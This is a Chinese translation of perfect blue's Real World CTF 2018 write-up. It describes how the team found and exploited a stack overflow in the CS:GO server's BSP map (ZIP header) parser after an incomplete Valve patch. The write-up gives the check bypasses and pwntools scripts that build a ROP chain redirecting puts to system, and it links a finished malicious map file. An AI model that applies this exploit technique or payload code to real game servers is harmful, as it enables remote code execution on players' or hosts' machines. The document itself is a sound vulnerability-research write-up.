> 原文链接: https://www.anquanke.com//post/id/156035 


# 从CTF题目中发现的CS：GO RCE 0day漏洞


                                阅读量   
                                **176565**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：perfect.blue
                                <br>原文地址：[https://blog.perfect.blue/P90_Rush_B](https://blog.perfect.blue/P90_Rush_B)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t01fff0e321a864977e.jpg)](https://p3.ssl.qhimg.com/t01fff0e321a864977e.jpg)

## 前言

P90_Rush_B这道题来自Real World CTF 资格赛 2018，我们以`perfect blue`的队伍名参加了这次比赛。

<a>@j0nathanj</a>和<a>@VoidMercy_pb.</a>解出了这道题目。

不幸的是，我们没有在比赛期间解出这道题目，但我们在接下来的两天内再接再厉，最后成功的exploit！:)

我们的解法包含一个0 day，前几天也刚刚被Eat Sleep Pwn Repeat队伍的<a>@_niklasb</a>大佬发现，且在最新的更新中已被修复。

我们决定尽可能详细的编写这篇文章，以展示我们全部的工作过程，包括从发现bug，到成功exploit，以及我们所遇到的一些问题。



## The Challenge

题目的描述 / 自述文件表明我们必须通过某种方式利用CS：GO处理地图的机制以实现代码执行。



## 观察

在阅读了自述文件和挑战描述之后，我们立即想到了一个最近[报告给HackerOne](https://hackerone.com/reports/351014)的 CS：GO漏洞。

这个漏洞是这道题目的捷径。它正是我们需要的那一类漏洞——一个BSP (地图) 解析器的漏洞！

不巧的是，在第一份报告之后，Valve已经修复了这个漏洞（还是说？哼哼……），我们决定以这个漏洞为基础，并在这个已修复漏洞的附近寻找新的漏洞。

解决这道题很重要的一点是要了解我们正在对付一个什么样的结构体/类，我们借助[这个](https://developer.valvesoftware.com/wiki/Source_BSP_File_Format)页面以及部分2007年的被泄露的[Source Engine](https://github.com/VSES/SourceEngine2007)的源码来推断出其结构体。

与此漏洞相关的结构体是`Zip_FileHeader`和`ZIP_EndOfCentralDirRecord`。贴上附件[structs.c](https://github.com/perfectblue/ctf-writeups/blob/b2cd24f6c42c4d5e5c6f1f05db5a7b929bf354b0/RealWorldCTF-2018/P90_Rush_B/src/structs.c)，里面包括了它们的完整的定义。

```
struct ZIP_FileHeader
`{`

  unsigned int  signature; //  4 bytes PK12 
  ...
  ...
  unsigned short  fileNameLength; // file name length 2 bytes 
  ...
  ...
  // The filename comes right after! (variable size) 
`}`;
```

```
struct ZIP_EndOfCentralDirRecord
`{`

  unsigned int  signature; // 4 bytes PK56
  ...
  ...
  unsigned short  nCentralDirectoryEntries_Total; // 2 bytes - A.K.A numFilesInZip
  ...
  ...

`}`;
```



## “被修复”的bug

正如发现者所报告的那样，旧的bug就在这个函数中`CZipPackFile::Prepare`。 [![](https://p1.ssl.qhimg.com/t01bd869c96d375ed8d.jpg)](https://p1.ssl.qhimg.com/t01bd869c96d375ed8d.jpg)

（此图片来自于最初的bug发现者）

在上图中，函数`Get()`调用`memcpy()`并将文件名（嵌入在地图文件本身中）复制到变量`tmpString`中。<br>
这个地方没有边界检查，因为`zipFileHeader.fileNameLength`和`filename`是嵌入在BSP文件本身的，所以会导致一个经典的基于栈的缓冲区溢出。

我们尝试运行由bug发现者提供的PoC地图，但由于断言机制崩溃了。



## 寻找新bug——“源代码”回顾

在阅读完2007年的这份被泄露的Source Engine源码后，我们知道每个BSP都会包含有一些ZIP文件，包含其文件名以及文件名长度。

还有一个`EndOfCentralDirectoryZIP`文件，表明我们已到达BSP文件的末尾（稍后会用到）。

普通ZIP文件具有签名`PK12` ，`EndOfCentralDirectory`ZIP具有签名`PK56`。

因为据说原来的漏洞已经被Valve修复，我们错误地认为补丁只是对`Get()`的边界检查，我们依赖于这一份**来自2007年**的泄露源码——我们都没有使用平常的工具，我们也没有IDA或者其他的反编译器，所以我们决定使用这份泄露的源码。

稍微阅读了源代码后，我们注意到另一个调用`Get()`函数的地方，并且使用的是另一个filename！

这段看似有bug的代码也与前一代码在相同的函数里`CZipPackFile::Prepare`。

```
bool CZipPackFile::Prepare( int64 fileLen, int64 nFileOfs )
`{`
...
...
    ZIP_FileHeader zipFileHeader;
    char filename[MAX_PATH];
    // Check for a preload section, expected to be the first file in the zip
    zipDirBuff.GetObjects( &amp;zipFileHeader );
    zipDirBuff.Get( filename, zipFileHeader.fileNameLength );
    filename[zipFileHeader.fileNameLength] = '';
...
...
`}`

```

如注释中所示（注释存在于实际泄漏的文件中），`Get()`函数此时复制ZIP中的“第一个文件”。

我们试图破坏ZIP中的第一个文件名，也试图破坏文件大小，但没有任何结果，我们在这浪费了相当多的时间。



## 找到bug——逆向工程

当我们回到家，用回自己实际的生产环境，我们决定尝试对这个本应被Valve针对报告进行修复的函数进行逆向。

为了找出错误的代码到底在哪个模块，我们决定调试由于断言而崩溃的PoC。最终我们发现它在`dedicated.so`里。

为了在IDA中找到这个“老旧的”易受攻击的函数，我们打开了`dedicated.so`，<br>
在相同的函数中搜索以警告信息出现在泄露代码中的字符串。

[![](https://p2.ssl.qhimg.com/t01c76950ada1059ec6.png)](https://p2.ssl.qhimg.com/t01c76950ada1059ec6.png)

在逆向完新的“已修复的”函数后，我们注意到有许多与泄露代码相同的地方。但当我们找到我们认为易受攻击的代码片段(我们找到的`get()`函数)的时候，我们注意到`zipFileHeader.fileNameLength`有边界检查：

[![](https://p4.ssl.qhimg.com/t01e956ebb82f894cde.png)](https://p4.ssl.qhimg.com/t01e956ebb82f894cde.png)

这时候，我们知道我们认为的漏洞实际上已经修复了。所以，我们继续逆向，并找到了报告为bug的代码片段。

[![](https://p1.ssl.qhimg.com/t011acdd27837281d81.png)](https://p1.ssl.qhimg.com/t011acdd27837281d81.png)

多亏了我们的变量重命名，我们立刻发现有些东西行不通。

如在第一个代码片段（称为“已修复片段”）中所见，当`fileNameLength` &lt;= 258时，或者是`fileNameLength` &lt; `max_fileNameLength`时，`max_fileNameLength`被更新为`fileNameLength`（从BSP中提取）。

在第一次`Get()`调用中，修复程序可防止溢出。但是，如果仔细观察，第二次调用`Get()`始终以`fileNameLength`用作长度——即使`fileNameLength`&gt; `max_fileNameLength`！

变量`tmpString`的长度是260字节，所以如果我们可以让第二次`Get()`在调用`memcpy()`时超过260字节——那么我们可以触发基于栈的缓冲区溢出！



## Bypass所有检查

所以，现在我们已经发现了漏洞，我们必须触发它以确认它是否真的存在！

我们花了相当多的时间试图触发漏洞 – 我们将BSP中的第二个ZIP文件（我们使用标头`PK12`识别它的位置）中的 `fileNameLength`更改为更大的东西，并且还将`fileName`变得更大，但我们注意到一些矛盾点。

我们注意到在超过一定大小之后，该函数在开始时就会失败，它在BSP上有一些验证检查。

在`Prepare()`的开头，有以下函数：

```
bool CZipPackFile::Prepare( int64 fileLen, int64 nFileOfs )
`{`
...
...
...
  // Find and read the central header directory from its expected position at end of the file
  bool bCentralDirRecord = false;
  int64 offset = fileLen - sizeof( ZIP_EndOfCentralDirRecord );

  // scan entire file from expected location for central dir
  for ( ; offset &gt;= 0; offset-- )
  `{`
    ReadFromPack( -1, (void*)&amp;rec, -1, sizeof( rec ), offset );
    m_swap.SwapFieldsToTargetEndian( &amp;rec );
    if ( rec.signature == PKID( 5, 6 ) )
    `{`
      bCentralDirRecord = true;
      break;
    `}`
  `}`


  Assert( bCentralDirRecord );
  if ( !bCentralDirRecord )
  `{`
    // no zip directory, bad zip
    return false;
  `}`
```

看起来很混乱？其实并不！

实际上这个函数只是在进行一个从`fileLen`到`sizeof(ZIP_EndOfCentralDirOrder)`的迭代，然后再回到文件开头，搜寻与`ZIP_EndOfCentralDirOrder`头部相匹配的4个字节（也就是`PK56`的值）

经过一些调试之后，我们注意到了无论我们把文件扩充到多大，`fileLen`却始终不会变！这意味着它是以某种方式静态保存的！

为了验证我们的理论，我们在HxD里搜索文件长度，也确实找到了它！:)

为了绕过上面的循环，我们必须赋予`fileLen`一个更大的值，因为`ZIP_EndOfCentralDirOrder`是文件中的最后一个结构体，如果`fileLen`过小，`fileLen`到`sizeof(ZIP_EndOf_CentralDirRecord)`的迭代会在`PK56`头之前开始，之后会一路回到文件的开头——我们也就没办法bypass检查了！

所以为了实现bypass，我们增大了`fileLen`并在文件末尾使用0填充，这样我们就总能保证绕过这个检查了！

（我们可以单纯的伪造`PK56`头，但我们想知道导致验证失败的根本原因是什么）



## 触发漏洞 – 0x41414141 in ?? ()

现在我们已经通过了`PK56`头验证，我们可以尝试用`tmpString`大字符串来造成溢出！

一开始，我们试图填充许多的`A`来控制EIP，但我们注意到栈里有许多元数据仍然在被函数使用……并把它们覆盖掉了。我们还注意到栈里的元数据是这样访问的（这是二进制文件中的一个实际示例）：

[![](https://p2.ssl.qhimg.com/t0162ed37be88ea2487.png)](https://p2.ssl.qhimg.com/t0162ed37be88ea2487.png)

（注意，对栈地址的访问有时也用在指令的目的地址）

所以我们决定用0覆盖掉除了返回地址意外的所有东西，这样我们就不会因为写入/读取无效地址而崩溃！

但事实证明，即使溢出0也是不够的，程序仍然会崩溃:( …

这一次，我们注意到在`Get()`函数溢出之后，即使我们用0覆盖数据，我们也会崩溃，因为这个函数在循环中，遍历ZIP文件夹中的所有文件。

还记得我们指出的那个必要的结构体吗？事实证明，`ZIP_EndOfCentralDirRecord.nCentralDirectoryEntries_Total`存放着zip中的文件数量！看泄露的源码就知道了：

```
...
int numFilesInZip = rec.nCentralDirectoryEntries_Total;

for ( int i = firstFileIdx; i &lt; numFilesInZip; ++i )
`{`
  ...
  // The Get() call is inside this loop.
  ...
`}`
```

把`ZIP_EndOfCentralDirRecord.nCentralDirectoryEntries_Total`改成2，获得第二个ZIP以实现溢出，会立即退出循环并导致函数结束，也就是说：我们可以控制EIP了！



## 建立ROP链

主二进制文件（`srcds`）是一个32位应用程序，它是在没有PIE、没有栈cookie的情况下编译的，并且没有启用Full Relro。

根据这些情况，我们建立了一条任意添加的ROP链，并把`system`的偏移量添加到`puts`GOT的条目中，然后调用`puts("/usr/bin/gnome-calculator")`，最后成功弹出了计算器 😀

下面的代码生成了一个ROP链的payload，我们可以在返回地址的偏移量中插入以调用`system("/usr/bin/gnome-calculator")`：

```
from pwn import *

add_what_where = 0x080488fe   # add dword ptr [eax + 0x5b], ebx ; pop ebp ; ret
pop_eax_ebx_ebp = 0x080488ff  # pop eax ; pop ebx ; pop ebp ; ret

putsgot = 0x8049CF8
putsoffset = 0x5fca0
systemoffset = 0x3ada0
putsplt = 0x080485E0

bss = 0x8049d68

command = "/usr/bin/gnome-calculator"

rop = []

for i in range(0, len(command), 4):
  current = int(command[i:][:4][::-1].encode("hex"), 16)
  rop += [pop_eax_ebx_ebp, bss + i - 0x5b, current, bss, add_what_where, bss]

rop += [pop_eax_ebx_ebp, putsgot - 0x5b, 0x100000000 - (putsoffset - systemoffset), bss, add_what_where, bss]
rop += [putsplt, bss, bss, bss]

payload = ""
for i in rop:
  payload += p32(i)


with open('rop', 'wb') as f:
  f.write(payload)

print '[+] Generated ROP.n'
```



## 完成 exploit

为了完成exploit，我们需要使用许多0来覆盖整个缓冲区直到返回地址为止，然后插入我们的ROP链payload！

```
from pwn import *

rop = ''

with open('rop', 'r') as f:
  rop = f.read()

payload  = p8(0) * 0x1c0 
payload += rop

with open('payload', 'w') as f:
  f.write(payload)

print '[+] Full payload generated.n'
```

插入我们的payload后，手动修改`fileLen`和`fileNameLength`，就可以执行代码了！最终的bsp[在这](https://blog.perfect.blue/assets/files/CSGO0day/exploit.bsp)

[![](https://blog.perfect.blue/assets/images/csgo_calc.gif)](https://blog.perfect.blue/assets/images/csgo_calc.gif)

（图片不动请[点我](https://blog.perfect.blue/assets/images/csgo_calc.gif)）



## 结论和经验
- 我们从这个挑战中吸取了一些教训，我们觉得最主要的是不应该依赖于旧的/泄漏的代码。我们本可以通过在IDA中打开二进制文件来节省大量时间，但即时当我们意识到应该这么做时，也没有立即动手。
- 有些人可能已经注意到了，对于没注意到的人，我跟你们港：Valve的第一个“补丁”实际上没有修复报告中提到的的漏洞！它确实修复了第一次出现的`Get()`调用，但没有修复第二次调用 – 报告说的实际就是这个！
这让我们学到了另一个重要的经验——永远不要相信“修复补丁”。总是去验证它实际上是否修复了bug！

我们在完成这一挑战时获得了很多乐趣，并且CTF挑战中找到了0 day！

期待Real World CTF 总决赛 – 2018！
